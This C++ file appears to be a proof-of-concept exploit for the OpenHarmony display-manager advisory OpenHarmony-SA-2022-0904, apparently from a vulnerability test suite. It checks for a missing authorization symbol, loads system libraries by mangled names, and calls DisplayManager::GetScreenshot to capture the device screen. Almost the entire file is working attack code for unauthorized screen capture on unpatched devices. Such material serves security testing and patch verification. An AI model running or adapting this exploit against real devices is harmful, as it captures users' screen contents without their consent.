/*
 * Copyright (c) 2023 Huawei Device Co., Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <dlfcn.h>
#include <memory>
#include <stdio.h>
#include <unistd.h>
namespace Media  {
    class PixelMap;
}

int main() {
    void *handle,*handle2;
    // 打开共享库libdms.z.so
    handle2 = dlopen("/system/lib/libdms.z.so", RTLD_LAZY);
    if (!handle2) {
        fprintf(stderr, "Error: %s\n", dlerror());
        return 1;
    }
    
    // 获取函数DisplayManagerStub::IsStartByHdcd地址
    void* IsStartByHdcd= dlsym(handle2, "_ZN4OHOS5Rosen18DisplayManagerStub13IsStartByHdcdEv");
    if (!IsStartByHdcd) {
        printf("OpenHarmony-SA-2022-0904: vulnerable!\n");
    } else {
        printf("OpenHarmony-SA-2022-0904: not vulnerable!\n");
        return 1;
    }

    // 打开共享库libdm.z.so
    handle = dlopen("/system/lib/libdm.z.so", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "Error: %s\n", dlerror());
        return 1;
    }

    // 获取函数DisplayManager::GetInstance地址
    typedef void* (*CreateObjFunc)();
    CreateObjFunc create_obj = reinterpret_cast<CreateObjFunc>(dlsym(handle, "_ZN4OHOS5Rosen14DisplayManager11GetInstanceEv"));
    if (create_obj == NULL) {
        fprintf(stderr, "Error: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }
    // 创建类实例
    void* obj = create_obj();
    
    // 获取函数DisplayManager::GetDefaultDisplayId地址
    typedef uint64_t (*DisplayId)(void*);
    DisplayId GetDefaultDisplayId = NULL;
    GetDefaultDisplayId = reinterpret_cast<DisplayId>( dlsym(handle, "_ZN4OHOS5Rosen14DisplayManager19GetDefaultDisplayIdEv"));
    if (GetDefaultDisplayId == NULL) {
        fprintf(stderr, "Error: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }

    // 调用函数DisplayManager::GetDefaultDisplayId
    uint64_t displayId = GetDefaultDisplayId(obj);
    if (displayId == -1ULL) {
        printf("GetDefaultDisplayId failed!\n");
    } else{
        printf("DisplayId: %llu\n", displayId);
    }
    
    // 获取函数DisplayManager::GetScreenshot地址
    typedef std::shared_ptr<Media::PixelMap> (*GetDisplaySnapshot)(void*,uint64_t);
    GetDisplaySnapshot GetPixelMap = nullptr;
    GetPixelMap = reinterpret_cast<GetDisplaySnapshot>(dlsym(handle, "_ZN4OHOS5Rosen14DisplayManager13GetScreenshotEy"));
    if (GetPixelMap == NULL) {
        fprintf(stderr, "Error: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }
    // 调用函数DisplayManager::GetScreenshot
    void* PixelMap = nullptr;
    PixelMap = GetPixelMap(obj,displayId).get();
    if (PixelMap == nullptr) {
        printf("GetPixelMap failed!\n");
    } else{
        printf("PixelMap: %p\n", PixelMap);
    }
    
    // 关闭共享库


    return 0;
}